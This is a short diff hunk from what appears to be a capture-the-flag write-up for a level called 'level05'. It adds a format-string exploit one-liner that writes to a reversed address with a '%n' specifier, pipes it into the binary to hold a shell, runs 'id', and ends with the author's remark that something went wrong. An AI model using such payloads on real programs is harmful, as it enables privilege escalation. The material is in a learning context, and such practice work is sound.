@@ -44,6 +44,12 @@ x/600wx $esp
 
 ```
 
+```
+(python -c 'print "\x08\x04\x97\xe0"[::-1] + "%4294958684d%10$n"' ; cat) | ./level05 > /dev/null
+id 1>&2
+```
+
+mmm smthg wrong
 
 
 
